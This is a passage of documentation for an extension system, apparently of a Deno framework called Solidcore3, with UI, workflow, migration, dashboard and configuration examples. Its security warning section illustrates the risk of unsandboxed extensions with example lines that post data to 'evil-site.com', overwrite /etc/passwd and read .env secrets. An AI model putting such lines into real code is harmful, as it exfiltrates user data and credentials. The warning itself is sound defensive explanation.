    }
    
    /* Theme toggle button */
    .theme-toggle {
      position: fixed;
      top: 20px;
      right: 20px;
      z-index: 1000;
      background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
      color: white;
      border: none;
      padding: 12px 16px;
      border-radius: 25px;
      cursor: pointer;
      font-size: 0.9rem;
      font-weight: 500;
      box-shadow: var(--task-shadow);
      transition: all 0.2s ease;
    }
    
    .theme-toggle:hover {
      transform: translateY(-1px);
      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
    }
  `,
  
  // Global JavaScript Injection
  scripts: `
    // Advanced theme management system
    (function() {
      // Theme state management
      const STORAGE_KEY = 'solidcore-task-theme';
      let currentTheme = localStorage.getItem(STORAGE_KEY) || 'light';
      
      // Initialize theme
      function initTheme() {
        document.documentElement.setAttribute('data-theme', currentTheme);
        updateThemeToggle();
      }
      
      // Theme toggle functionality
      function createThemeToggle() {
        const toggle = document.createElement('button');
        toggle.className = 'theme-toggle';
        toggle.onclick = toggleTheme;
        document.body.appendChild(toggle);
        return toggle;
      }
      
      function updateThemeToggle() {
        const toggle = document.querySelector('.theme-toggle');
        if (toggle) {
          toggle.textContent = currentTheme === 'dark' ? '☀️ Light Mode' : '🌙 Dark Mode';
        }
      }
      
      function toggleTheme() {
        currentTheme = currentTheme === 'dark' ? 'light' : 'dark';
        localStorage.setItem(STORAGE_KEY, currentTheme);
        document.documentElement.setAttribute('data-theme', currentTheme);
        updateThemeToggle();
        
        // Emit custom event for other components
        window.dispatchEvent(new CustomEvent('themeChanged', { 
          detail: { theme: currentTheme } 
        }));
      }
      
      // Enhanced task card interactions
      function enhanceTaskCards() {
        const cards = document.querySelectorAll('[data-entity="Task"]');
        cards.forEach(card => {
          // Add priority data attribute
          const priorityElement = card.querySelector('[data-field="priority"]');
          if (priorityElement) {
            const priority = priorityElement.textContent?.trim().toLowerCase();
            card.setAttribute('data-priority', priority);
            card.classList.add('task-card');
          }
          
          // Enhanced status badges
          const statusElement = card.querySelector('[data-field="status"]');
          if (statusElement) {
            const status = statusElement.textContent?.trim().toLowerCase().replace(/[^a-z]/g, '-');
            statusElement.className = \`status-badge status-\${status}\`;
          }
          
          // Add completion animation
          const completeButton = card.querySelector('[data-action="complete"]');
          if (completeButton) {
            completeButton.addEventListener('click', () => {
              card.classList.add('task-completed');
              setTimeout(() => card.classList.remove('task-completed'), 500);
            });
          }
        });
      }
      
      // Keyboard shortcuts
      function setupKeyboardShortcuts() {
        document.addEventListener('keydown', (e) => {
          // Ctrl/Cmd + Shift + T = Toggle theme
          if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'T') {
            e.preventDefault();
            toggleTheme();
          }
          
          // Ctrl/Cmd + Shift + N = New task (if on task list page)
          if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key === 'N') {
            const newTaskButton = document.querySelector('[data-action="create"]');
            if (newTaskButton) {
              e.preventDefault();
              newTaskButton.click();
            }
          }
        });
      }
      
      // Search enhancement
      function enhanceSearch() {
        const searchInputs = document.querySelectorAll('input[type="search"], input[name*="search"]');
        searchInputs.forEach(input => {
          // Add search shortcuts
          input.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
              input.value = '';
              input.blur();
            }
          });
          
          // Add search icons
          const wrapper = document.createElement('div');
          wrapper.style.position = 'relative';
          wrapper.style.display = 'inline-block';
          input.parentNode.insertBefore(wrapper, input);
          wrapper.appendChild(input);
          
          const icon = document.createElement('span');
          icon.innerHTML = '🔍';
          icon.style.position = 'absolute';
          icon.style.right = '10px';
          icon.style.top = '50%';
          icon.style.transform = 'translateY(-50%)';
          icon.style.pointerEvents = 'none';
          wrapper.appendChild(icon);
        });
      }
      
      // Auto-save for forms
      function setupAutoSave() {
        const forms = document.querySelectorAll('form[data-entity]');
        forms.forEach(form => {
          const entity = form.getAttribute('data-entity');
          const storageKey = \`autosave-\${entity}-\${Date.now()}\`;
          
          // Save form data on input
          form.addEventListener('input', debounce(() => {
            const formData = new FormData(form);
            const data = Object.fromEntries(formData);
            localStorage.setItem(storageKey, JSON.stringify(data));
          }, 1000));
          
          // Restore form data on load
          const savedData = localStorage.getItem(storageKey);
          if (savedData) {
            try {
              const data = JSON.parse(savedData);
              Object.entries(data).forEach(([name, value]) => {
                const field = form.querySelector(\`[name="\${name}"]\`);
                if (field) field.value = value;
              });
            } catch (e) {
              console.warn('Failed to restore auto-saved data:', e);
            }
          }
          
          // Clear saved data on successful submit
          form.addEventListener('submit', () => {
            localStorage.removeItem(storageKey);
          });
        });
      }
      
      // Utility function
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }
      
      // Initialize everything
      function init() {
        initTheme();
        createThemeToggle();
        enhanceTaskCards();
        setupKeyboardShortcuts();
        enhanceSearch();
        setupAutoSave();
        
        console.log('🎨 Task Themes UI extension loaded');
        console.log('   Features: Dark/Light themes, Enhanced cards, Keyboard shortcuts, Auto-save');
      }
      
      // Run on DOM ready
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
      } else {
        init();
      }
      
      // Re-run enhancements when new content is loaded (SPA navigation)
      const observer = new MutationObserver(debounce(() => {
        enhanceTaskCards();
        enhanceSearch();
      }, 100));
      
      observer.observe(document.body, {
        childList: true,
        subtree: true
      });
    })();
  `,
  
  // Component Enhancement System
  components: [
    {
      name: 'enhanced-task-row',
      inject: {
        position: 'after',
        target: 'table tbody tr',         // Target specific elements
        content: `
          <tr class="enhancement-row" style="background: #f8f9fa;">
            <td colspan="100%" style="padding: 8px; font-size: 0.875rem; color: #6c757d;">
              ✨ Enhanced by Task Themes Extension
            </td>
          </tr>
        `
      }
    },
    {
      name: 'task-list-header',
      inject: {
        position: 'before',
        target: '.task-list, [data-view="TaskList"]',
        content: `
          <div style="margin-bottom: 1rem; padding: 1rem; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border-radius: 8px;">
            <h3 style="margin: 0 0 0.5rem 0; font-size: 1.25rem;">🚀 Enhanced Task Management</h3>
            <p style="margin: 0; opacity: 0.9;">
              Features: Dark/Light themes • Priority indicators • Keyboard shortcuts (Ctrl+Shift+T for theme toggle)
            </p>
          </div>
        `
      }
    },
    {
      name: 'productivity-stats',
      wrapper: (OriginalComponent) => (props) => {
        // Component wrapping - enhance existing components
        return \`
          <div class="productivity-wrapper">
            <div class="productivity-stats" style="display: flex; gap: 1rem; margin-bottom: 1rem;">
              <div style="padding: 0.5rem 1rem; background: #e3f2fd; border-radius: 4px;">
                📊 <strong>Today:</strong> 5 completed
              </div>
              <div style="padding: 0.5rem 1rem; background: #f3e5f5; border-radius: 4px;">
                🔥 <strong>Streak:</strong> 3 days
              </div>
            </div>
            \${OriginalComponent(props)}
          </div>
        \`;
      }
    }
  ]
};

export default extension;

// Optional initialization with extension context
export async function init(context: ExtensionContext) {
  console.log('🎨 Task Themes UI extension initialized');
  
  // Access to framework utilities
  context.events.on('task.created', (event) => {
    // Show toast notification
    if (window.showToast) {
      window.showToast('Task created successfully!', 'success');
    }
  });
  
  // Register custom CSS custom properties
  document.documentElement.style.setProperty('--extension-loaded', 'true');
}
```

#### **UI Extension Capabilities**

**Style Override System:**
- **Global CSS Injection**: Add custom stylesheets
- **CSS Custom Properties**: Theme system support
- **Component-Specific Styles**: Target specific entities or views
- **Responsive Design**: Built-in breakpoint support

**Script Enhancement System:**
- **Global JavaScript**: Add custom client-side behavior
- **Event System Integration**: Listen to framework events
- **DOM Enhancement**: Modify generated markup
- **Progressive Enhancement**: Graceful degradation

**Component Override System:**
- **Wrapper Pattern**: Enhance existing components without breaking them
- **Content Injection**: Insert content at specific DOM locations
- **Component Replacement**: Complete component override
- **Position Control**: Before, after, or replace existing elements

### 🤖 Workflow Extensions (`WorkflowExtension`)

Workflow Extensions provide business logic and automation customization.

#### **Complete Workflow Extension Example**
```typescript
// app/extensions/advanced-notifications.ts
import { WorkflowExtension } from '../../core/types/extensions.ts';

const extension: WorkflowExtension = {
  name: 'advanced-notifications',
  type: 'workflow',
  version: '2.0.0',
  description: 'Advanced notification system with multiple channels and smart routing',
  author: 'DevOps Team',
  
  // Custom Actions (Available in truth file workflows)
  actions: {
    'slack.advanced': {
      name: 'Send advanced Slack notification',
      description: 'Send formatted Slack message with attachments and threading',
      parameters: {
        channel: { type: 'string', required: true, default: '#general' },
        message: { type: 'string', required: true },
        webhookUrl: { type: 'string', required: true },
        threadTs: { type: 'string', description: 'Reply to thread' },
        mentions: { type: 'array', description: 'Users to mention' },
        attachments: { type: 'array', description: 'Rich attachments' }
      },
      handler: async (event, params) => {
        console.log(\`💬 Slack notification to \${params.channel}:\`);
        console.log(\`   📝 \${params.message}\`);
        console.log(\`   🔗 Entity: \${event.entity}:\${event.entityId}\`);
        
        const payload = {
          channel: params.channel,
          text: params.message,
          thread_ts: params.threadTs,
          attachments: [
            {
              color: getColorForPriority(event.data.priority),
              title: \`\${event.entity} \${event.behavior || 'Updated'}\`,
              title_link: \`\${process.env.APP_URL}/\${event.entity.toLowerCase()}s/\${event.entityId}\`,
              fields: [
                {
                  title: 'Priority',
                  value: event.data.priority || 'medium',
                  short: true
                },
                {
                  title: 'Status', 
                  value: event.data.status || 'unknown',
                  short: true
                }
              ],
              footer: 'Solidcore3 Framework',
              ts: Math.floor(Date.now() / 1000)
            }
          ]
        };
        
        // Add mentions
        if (params.mentions && params.mentions.length > 0) {
          payload.text += \`\n\${params.mentions.map(u => \`<@\${u}>\`).join(' ')}\`;
        }
        
        try {
          const response = await fetch(params.webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
          });
          
          if (!response.ok) {
            throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
          }
          
          console.log('✅ Slack notification sent successfully');
        } catch (error) {
          console.error('❌ Slack notification failed:', error);
          throw error; // Re-throw to trigger retry logic
        }
      }
    },
    
    'email.template': {
      name: 'Send templated email',
      description: 'Send HTML email using predefined templates',
      parameters: {
        to: { type: 'string', required: true },
        template: { type: 'string', required: true },
        subject: { type: 'string' },
        data: { type: 'object', description: 'Template variables' }
      },
      handler: async (event, params) => {
        console.log(\`📧 Email to \${params.to} using template '\${params.template}'\`);
        
        const templateData = {
          ...event.data,
          event: event,
          ...params.data,
          appName: 'TaskManager',
          appUrl: process.env.APP_URL
        };
        
        const { subject, html } = await renderEmailTemplate(params.template, templateData);
        
        // In production, integrate with email service (SendGrid, etc.)
        console.log(\`   📋 Subject: \${params.subject || subject}\`);
        console.log(\`   💌 HTML length: \${html.length} chars\`);
        
        // Mock email sending
        await mockEmailSend({
          to: params.to,
          subject: params.subject || subject,
          html: html,
          text: stripHtml(html)
        });
      }
    },
    
    'webhook.retry': {
      name: 'Webhook with exponential backoff retry',
      description: 'Send webhook with intelligent retry logic and circuit breaker',
      parameters: {
        url: { type: 'string', required: true },
        method: { type: 'string', default: 'POST' },
        headers: { type: 'object' },
        data: { type: 'object' },
        retries: { type: 'number', default: 3 },
        timeout: { type: 'number', default: 10000 },
        circuitBreaker: { type: 'boolean', default: true }
      },
      handler: async (event, params) => {
        const maxRetries = params.retries || 3;
        const timeout = params.timeout || 10000;
        let attempt = 0;
        
        // Circuit breaker check
        if (params.circuitBreaker && await isCircuitOpen(params.url)) {
          throw new Error('Circuit breaker open - too many recent failures');
        }
        
        while (attempt < maxRetries) {
          try {
            console.log(\`🔗 Webhook attempt \${attempt + 1}/\${maxRetries} to \${params.url}\`);
            
            const payload = params.data || {
              event: \`\${event.entity}.\${event.behavior || 'updated'}\`,
              entity: event.entity,
              entityId: event.entityId,
              data: event.data,
              timestamp: event.timestamp,
              user: event.user
            };
            
            const response = await fetch(params.url, {
              method: params.method || 'POST',
              headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'Solidcore3-Webhook/1.0',
                ...params.headers
              },
              body: JSON.stringify(payload),
              signal: AbortSignal.timeout(timeout)
            });
            
            if (response.ok) {
              console.log(\`✅ Webhook successful (HTTP \${response.status})\`);
              await recordWebhookSuccess(params.url);
              return await response.json().catch(() => null); // Optional response parsing
            } else {
              throw new Error(\`HTTP \${response.status}: \${response.statusText}\`);
            }
            
          } catch (error) {
            attempt++;
            console.error(\`❌ Webhook attempt \${attempt} failed:\`, error.message);
            
            await recordWebhookFailure(params.url, error);
            
            if (attempt < maxRetries) {
              // Exponential backoff: 1s, 2s, 4s, 8s...
              const delay = Math.min(Math.pow(2, attempt) * 1000, 30000);
              console.log(\`⏳ Retrying in \${delay}ms...\`);
              await new Promise(resolve => setTimeout(resolve, delay));
            }
          }
        }
        
        // All retries failed
        await updateCircuitBreaker(params.url, false);
        throw new Error(\`Webhook failed after \${maxRetries} attempts\`);
      }
    },
    
    'analytics.track': {
      name: 'Track analytics event',
      description: 'Send event to analytics platforms (GA, Mixpanel, etc.)',
      parameters: {
        eventName: { type: 'string', required: true },
        properties: { type: 'object' },
        userId: { type: 'string' },
        platforms: { type: 'array', default: ['console'] }
      },
      handler: async (event, params) => {
        const eventData = {
          event: params.eventName,
          properties: {
            entity: event.entity,
            entityId: event.entityId,
            behavior: event.behavior,
            timestamp: event.timestamp,
            ...params.properties
          },
          userId: params.userId || event.user?.id,
          timestamp: new Date().toISOString()
        };
        
        console.log(\`📊 Analytics: \${params.eventName}\`, eventData);
        
        // Send to multiple platforms
        const platforms = params.platforms || ['console'];
        const promises = platforms.map(platform => {
          switch (platform) {
            case 'mixpanel':
              return sendToMixpanel(eventData);
            case 'segment':
              return sendToSegment(eventData);
            case 'googleAnalytics':
              return sendToGA(eventData);
            case 'console':
            default:
              return Promise.resolve(console.log('📈 Analytics tracked:', eventData));
          }
        });
        
        await Promise.allSettled(promises);
      }
    }
  },
  
  // Custom Triggers (Event-driven automation)
  triggers: {
    'task.overdue': {
      name: 'Task overdue detection',
      description: 'Triggers when a task becomes overdue',
      condition: (event) => {
        return event.data.dueDate && 
               new Date(event.data.dueDate) < new Date() &&
               event.data.status !== 'done';
      },
      handler: async (event) => {
        console.log(\`🚨 Task overdue: \${event.data.title}\`);
        
        // Auto-escalate to manager
        if (event.data.assigneeId) {
          const manager = await getManagerFor(event.data.assigneeId);
          if (manager) {
            await sendEscalationNotification(manager, event.data);
          }
        }
        
        // Update priority if not already high
        if (event.data.priority !== 'high') {
          await updateTaskPriority(event.entityId, 'high');
        }
      }
    },
    
    'user.inactive': {
      name: 'User inactivity detection',
      description: 'Triggers when a user has been inactive for too long',
      condition: (event) => {
        if (event.entity !== 'User') return false;
        
        const lastActive = new Date(event.data.lastActiveAt || event.data.createdAt);
        const daysSinceActive = (Date.now() - lastActive.getTime()) / (1000 * 60 * 60 * 24);
        
        return daysSinceActive > 30; // 30 days inactive
      },
      handler: async (event) => {
        console.log(\`😴 User inactive: \${event.data.email}\`);
        
        // Send re-engagement email
        await sendReengagementEmail(event.data);
        
        // Flag for admin review
        await flagForAdminReview(event.entityId, 'inactive_user');
      }
    },
    
    'performance.degradation': {
      name: 'Performance degradation detection',
      description: 'Triggers when system performance degrades',
      condition: (event) => {
        // Custom logic to detect performance issues
        return event.type === 'system.metrics' && 
               event.data.responseTime > 2000; // 2 second threshold
      },
      handler: async (event) => {
        console.log(\`⚠️ Performance degradation detected: \${event.data.responseTime}ms\`);
        
        // Alert DevOps team
        await sendPerformanceAlert(event.data);
        
        // Auto-scale if possible
        if (event.data.cpuUsage > 80) {
          await triggerAutoScale();
        }
      }
    }
  }
};

// Helper functions (would be implemented in production)
async function renderEmailTemplate(template: string, data: any) {
  // Mock template rendering
  return {
    subject: \`Task \${data.event.behavior || 'updated'}: \${data.title}\`,
    html: \`<h1>Task \${data.event.behavior || 'Updated'}</h1><p>\${data.title}</p>\`
  };
}

async function mockEmailSend(email: any) {
  // Mock email sending
  console.log(\`📧 Email sent to \${email.to}\`);
}

function getColorForPriority(priority: string) {
  const colors = { high: 'danger', medium: 'warning', low: 'good' };
  return colors[priority as keyof typeof colors] || 'good';
}

async function isCircuitOpen(url: string) {
  // Circuit breaker logic
  return false; // Mock implementation
}

async function recordWebhookSuccess(url: string) {
  console.log(\`✅ Webhook success recorded for \${url}\`);
}

async function recordWebhookFailure(url: string, error: Error) {
  console.log(\`❌ Webhook failure recorded for \${url}: \${error.message}\`);
}

async function updateCircuitBreaker(url: string, success: boolean) {
  console.log(\`🔄 Circuit breaker updated for \${url}: \${success ? 'success' : 'failure'}\`);
}

export default extension;

// Extension initialization
export async function init(context: ExtensionContext) {
  console.log('🔔 Advanced Notifications extension initialized');
  
  // Register system event listeners
  context.events.on('system.startup', async () => {
    console.log('🚀 System started - notifications ready');
  });
  
  context.events.on('system.metrics', async (event) => {
    // Monitor system performance
    if (event.data.responseTime > 1000) {
      console.log(\`⚠️ Slow response detected: \${event.data.responseTime}ms\`);
    }
  });
  
  // Setup circuit breaker cleanup
  setInterval(() => {
    // Reset circuit breakers periodically
    console.log('🔄 Resetting circuit breakers...');
  }, 300000); // Every 5 minutes
}
```

#### **Workflow Extension Capabilities**

**Custom Actions:**
- **Parameter Validation**: Type-safe parameter definitions
- **Async Support**: Full async/await support
- **Error Handling**: Built-in retry and error recovery
- **Context Access**: Full access to database, events, and utilities

**Custom Triggers:**
- **Event Filtering**: Condition-based trigger execution
- **Multi-Entity Support**: Triggers can respond to any entity
- **System Events**: Listen to framework-level events
- **Performance Monitoring**: Built-in performance tracking

### 🔗 Extension Loading & Management

#### **Auto-Discovery System**
```typescript
// Runtime automatically discovers and loads extensions
const extensionFiles = await Deno.readDir('./app/extensions');
for await (const entry of extensionFiles) {
  if (entry.name.endsWith('.ts')) {
    const extension = await import(\`./app/extensions/\${entry.name}\`);
    await extensionRegistry.register(extension.default);
  }
}
```

#### **Extension Context**
All extensions receive a rich context object:

```typescript
interface ExtensionContext {
  app: AppDefinition;      // Full access to truth file
  db: DatabaseClient;      // Direct database access
  events: EventEmitter;    // Event system access
  utils: ExtensionUtils;   // Helper functions
  config: Config;          // Framework configuration
  logger: Logger;          // Structured logging
}

interface ExtensionUtils {
  // Validation
  validateInput: (data: any, schema: any) => any;
  
  // Security  
  hashPassword: (password: string) => Promise<string>;
  verifyPassword: (password: string, hash: string) => Promise<boolean>;
  generateToken: () => string;
  
  // Communication
  sendEmail: (to: string, subject: string, body: string) => Promise<void>;
  callWebhook: (url: string, data: any) => Promise<any>;
  
  // Logging
  log: (level: 'info' | 'warn' | 'error', message: string, data?: any) => void;
  
  // Utilities
  formatDate: (date: Date, format?: string) => string;
  generateSlug: (text: string) => string;
  sanitizeHtml: (html: string) => string;
}
```

### 🛡️ Extension Security & Sandboxing

> **🚨 CRITICAL SECURITY WARNING**: Extensions currently run with **unrestricted access**. This is a significant security risk for production applications.

#### **Current Security State (v1.0)**
- **❌ No Sandboxing**: Despite configuration, no actual isolation exists
- **❌ Unrestricted Database Access**: Extensions can read/write any data
- **❌ Full File System Access**: Extensions inherit Deno's broad permissions
- **❌ Unlimited Network Access**: Extensions can call any external service
- **❌ No Resource Limits**: Memory, CPU, and timeout limits not enforced
- **❌ No Import Restrictions**: Can import any Deno-accessible module

#### **What Extensions Can Currently Do**
```typescript
// ✅ Extensions have full access to:
const context = {
  db: DatabaseClient,           // Unrestricted SQL execution
  app: AppDefinition,          // Complete truth file access
  events: EventEmitter,        // Emit/listen to any events
  utils: {
    sendEmail: () => {},       // Send emails to anyone
    callWebhook: () => {},     // Call any external API
    // ... all utility functions
  }
}

// ⚠️ Extensions can also:
await fetch('https://evil-site.com', {
  method: 'POST',
  body: JSON.stringify(sensitiveData)  // Data exfiltration
});

await Deno.writeTextFile('/etc/passwd', 'malicious');  // File system access
await Deno.readTextFile('.env');                       // Read secrets
```

#### **Planned Security Model (Future)**
```typescript
// Future permission system (not yet implemented)
{
  permissions: {
    database: ['read', 'write'],     // Database access
    network: ['fetch'],              // Network requests  
    filesystem: ['read'],            // File system access
    events: ['emit', 'listen']       // Event system access
  },
  
  // Resource limits (not enforced)
  limits: {
    memory: '100MB',                 // Memory limit
    cpu: '50%',                      // CPU limit  
    timeout: 30000                   // Execution timeout
  }
}
```

#### **Current Validation Only**
- **✅ Type Checking**: Full TypeScript validation
- **✅ Schema Validation**: Basic structure validation
- **❌ Security Scanning**: No actual security checks
- **❌ Import Filtering**: No import restrictions enforced

#### **Production Recommendations**
1. **Code Review**: Manually review all extensions
2. **Trusted Sources**: Only use extensions from trusted developers
3. **Environment Isolation**: Run in containerized environments
4. **Network Restrictions**: Use firewalls to limit extension network access
5. **File System Permissions**: Restrict Deno's file system permissions
6. **Regular Audits**: Monitor extension behavior and data access

### 📊 Extension Development & Debugging

#### **Extension Debug Endpoints**
```typescript
// GET /debug/extensions - Extension registry information
// GET /debug/extensions/[name] - Specific extension details
// POST /debug/extensions/[name]/reload - Hot reload extension
```

#### **Extension Testing**
```typescript
// Test individual extensions
import { extension } from './app/extensions/task-analytics.ts';

Deno.test('Task Analytics Extension', async () => {
  const mockContext = createMockContext();
  const mockEvent = createMockEvent('task.created');
  
  await extension.hooks.afterCreate(mockEvent.data, mockEvent.result, mockContext);
  
  // Assert expected behavior
});
```

### 🚀 Extension Best Practices

#### **1. Naming Conventions**
- **Entity Extensions**: `[entity-name]-[type].ts` (e.g., `task-api.ts`)
- **Feature Extensions**: `[feature-name].ts` (e.g., `notifications.ts`)
- **Integration Extensions**: `[service-name].ts` (e.g., `slack-integration.ts`)

#### **2. Error Handling**
```typescript
// Always handle errors gracefully
hooks: {
  afterCreate: async (data, result, context) => {
    try {
      await sendNotification(data);
    } catch (error) {
      context.logger.error('Notification failed', { error, data });
      // Don't throw - let the main operation succeed
    }
  }
}
```

#### **3. Performance Considerations**
```typescript
// Use async for non-blocking operations
actions: {
  'heavy-computation': {
    handler: async (event, params) => {
      // Offload to background job
      await scheduleBackgroundJob('process-data', { 
        eventId: event.id,
        params 
      });
      
      return { scheduled: true };
    }
  }
}
```

#### **4. Versioning & Compatibility**
```typescript
const extension: APIExtension = {
  name: 'task-analytics',
  version: '2.1.0',
  
  // Specify framework compatibility
  requires: {
    solidcore: '^3.0.0',
    deno: '^2.0.0'
  },
  
  // Migration support
  migrations: {
    '2.0.0': async (context) => {
      // Migrate from v1 to v2
    }
  }
};
```

Extensions provide **complete escape hatches** from the declarative truth file while maintaining the framework's core benefits. They enable progressive complexity disclosure - start simple with the truth file, add sophistication with extensions as needed.

---

## 🎛️ 7. BUILT-IN SYSTEM FEATURES

**Solidcore3 includes powerful built-in systems that work automatically.** These features are fully implemented and ready to use.

### 🏗️ **Database Migration System**

**Automatic schema evolution from truth file changes.**

#### **How It Works**
```typescript
// Changes to app.truth.ts automatically generate migrations
const migrator = new DatabaseMigrator();

// Auto-migrate on startup (development)
await migrator.migrate(app);

// Manual migration control (production) 
await migrator.generateMigrations();
await migrator.runMigrations();

// Emergency reset (development only)
await migrator.reset();
```

#### **Migration Features**
- **Automatic Detection**: Framework compares truth file to database schema
- **Transactional Safety**: All migrations run in transactions with rollback
- **History Tracking**: `_migrations` table tracks applied migrations
- **Schema Versioning**: Each migration has version and timestamp
- **Data Preservation**: Migrations preserve existing data when possible

#### **Migration Process**
1. **Detection**: Framework detects truth file changes
2. **Planning**: Generates SQL migration statements
3. **Validation**: Checks migration safety and dependencies  
4. **Execution**: Runs migration in transaction
5. **Verification**: Confirms schema matches truth file
6. **Recording**: Logs migration in history table

#### **🚨 Database Seeding Limitation**
> **Current State**: Solidcore3 **does not include a built-in data seeding system**. Initial data population requires manual approaches.

**What's Missing:**
- ❌ No `seeds/` directory or seeding utilities
- ❌ No built-in fixtures or sample data support
- ❌ No `deno task seed` command
- ❌ No seed data configuration in truth file

**Current Workarounds:**

**Option 1: Extension-Based Seeding**
```typescript
// app/extensions/database-seeder.ts
import { APIExtension } from '../../core/types/extensions.ts';

const extension: APIExtension = {
  name: 'database-seeder',
  type: 'api',
  
  routes: [{
    path: '/admin/seed',
    method: 'POST',
    handler: async (context) => {
      if (context.user?.role !== 'admin') {
        return context.json({ error: 'Unauthorized' }, 403);
      }
      
      // Seed default data
      await context.db.execute(`
        INSERT OR IGNORE INTO user (id, name, email, role) VALUES 
        ('admin-1', 'Admin User', 'admin@example.com', 'admin'),
        ('user-1', 'Demo User', 'demo@example.com', 'user')
      `);
      
      await context.db.execute(`
        INSERT OR IGNORE INTO category (id, name, slug) VALUES 
        ('cat-1', 'Technology', 'technology'),
        ('cat-2', 'Lifestyle', 'lifestyle')
      `);
      
      return context.json({ message: 'Database seeded successfully' });
    }
  }]
};

export default extension;
```

**Option 2: Migration-Based Initial Data**
```typescript
// Modify the migration system to include initial data
// (Requires framework modification)
```

**Option 3: Manual SQL Execution**
```bash
# Direct database manipulation
deno run --allow-read --allow-write scripts/seed.ts
```

**Recommended Pattern:**
Create a dedicated seeding extension that provides admin endpoints for populating initial data like default users, categories, settings, etc.

### 🎯 **System Dashboard**

**Comprehensive admin interface accessible at `/dashboard`.**

#### **Dashboard Pages**

**Main Dashboard** (`/dashboard`)
- Application overview and health status
- Entity relationship visualization
- Quick access to all admin functions
- Real-time system metrics and performance

**Truth Analyzer** (`/dashboard/truth`)
```typescript
// Automatic analysis of your truth file
{
  "analysis": {
    "entities": 5,
    "totalFields": 23,
    "relationships": 3,
    "workflows": 2,
    "healthScore": 85,
    "suggestions": [
      "Add indexes for frequently queried fields",
      "Consider breaking down large entities"
    ]
  },
  "recommendations": {
    "performance": ["Add caching for User entity"],
    "security": ["Review admin permissions"],
    "architecture": ["Consider entity relationships"]
  }
}
```

**Database Browser** (`/dashboard/database`)
- Interactive SQL query interface
- Table browser with schema information
- Data export and import tools
- Migration history viewer
- Real-time query performance metrics

**API Explorer** (`/dashboard/api`)
- Interactive API documentation
- Request/response testing interface
- Authentication testing
- Rate limiting status
- Extension endpoint discovery

**Extension Manager** (`/dashboard/extensions`)
- View all loaded extensions
- Extension status and health
- Hot reload extensions in development
- Extension configuration editor
- Dependency and version management

**Configuration Viewer** (`/dashboard/config`)
- Current configuration visualization
- Environment variable override status
- Configuration validation results
- Export configuration to files
- Live configuration editing (development)

#### **Dashboard Features**
- **Real-time Updates**: Dashboard updates automatically as system changes
- **Health Monitoring**: Traffic lights system for component health
- **Performance Metrics**: Request timing, database query analysis
- **Security Status**: Permission validation, security recommendations
- **Development Tools**: Hot reload status, validation results

### ⚙️ **Advanced Configuration System**

**Multi-source configuration with live reloading and validation.**

#### **Configuration Sources** (Priority Order)
1. **CLI Arguments**: `--port 3000 --debug`
2. **Environment Variables**: `PORT=3000 DEBUG=true`  
3. **Config Files**: `solidcore.config.ts`
4. **Defaults**: Built-in sensible defaults

#### **Complete Configuration Options**
```typescript
// solidcore.config.ts - All available options
export default {
  // Server Configuration
  server: {
    port: 8000,
    host: '0.0.0.0',
    cors: {
      origin: ['http://localhost:3000'],
      credentials: true
    },
    compression: {
      enabled: true,
      level: 6,
      threshold: 1024
    },
    rateLimit: {
      windowMs: 900000,     // 15 minutes
      max: 100,             // Max requests per window
      standardHeaders: true,
      legacyHeaders: false,
      skipSuccessfulRequests: false,
      skipFailedRequests: false,
      whitelist: ['127.0.0.1'],
      blacklist: []
    },
    security: {
      helmet: true,
      hsts: {
        maxAge: 31536000,
        includeSubDomains: true,
        preload: true
      },
      csp: {
        directives: {
          defaultSrc: ["'self'"],
          styleSrc: ["'self'", "'unsafe-inline'"],
          scriptSrc: ["'self'"],
          imgSrc: ["'self'", "data:", "https:"]
        }
      },
      noSniff: true,
      xssFilter: true,
      referrerPolicy: 'same-origin'
    }
  },

  // Database Configuration  
  database: {
    type: 'turso',           // 'turso' | 'sqlite' | 'libsql'
    url: process.env.DATABASE_URL || 'file:./data/app.db',
    authToken: process.env.TURSO_AUTH_TOKEN,
    syncUrl: process.env.TURSO_SYNC_URL,
    syncInterval: 60,        // seconds
    readYourWrites: true,
    encryptionKey: process.env.DB_ENCRYPTION_KEY,
    pooling: {
      min: 2,
      max: 10,
      acquireTimeoutMillis: 60000,
      idleTimeoutMillis: 600000
    },
    migrations: {
      auto: true,            // Auto-run migrations on startup
      backup: true,          // Backup before migrations
      timeout: 30000         // Migration timeout (ms)
    }
  },

  // Authentication Configuration
  auth: {
    enabled: false,
    sessionTimeout: 86400,   // 24 hours in seconds
    providers: {
      local: {
        enabled: true,
        passwordMinLength: 8,
        requireEmailVerification: false
      },
      oauth: {
        enabled: false,
        providers: ['google', 'github'],
        redirectUrl: '/auth/callback'
      }
    },
    jwt: {
      secret: process.env.JWT_SECRET,
      expiresIn: '24h',
      algorithm: 'HS256'
    }
  },

  // Extension Configuration
  extensions: {
    enabled: true,
    directory: './app/extensions',
    autoload: true,
    whitelist: [],           // Only load these extensions
    blacklist: [],           // Never load these extensions
    sandbox: {
      memory: '100MB',
      timeout: 30000,
      allowedImports: ['std/', 'npm:'],
      blockedImports: ['node:fs', 'node:child_process']
    }
  },

  // UI Configuration
  ui: {
    theme: 'light',          // 'light' | 'dark' | 'auto'
    components: {
      constrainedSystem: true,
      responsiveBreakpoints: {
        mobile: '768px',
        tablet: '1024px',
        desktop: '1280px'
      }
    }
  },

  // Development Configuration
  development: {
    hotReload: true,
    debugMode: false,
    logLevel: 'info',        // 'debug' | 'info' | 'warn' | 'error'
    profiling: false,
    mockData: false
  },

  // Production Configuration
  production: {
    compression: true,
    caching: {
      enabled: true,
      type: 'memory',        // 'memory' | 'redis' | 'file'
      ttl: 3600,            // 1 hour
      redis: {
        host: process.env.REDIS_HOST || 'localhost',
        port: parseInt(process.env.REDIS_PORT || '6379'),
        password: process.env.REDIS_PASSWORD
      }
    },
    monitoring: {
      enabled: true,
      metrics: {
        enabled: true,
        endpoint: '/metrics',
        prometheus: true
      },
      logging: {
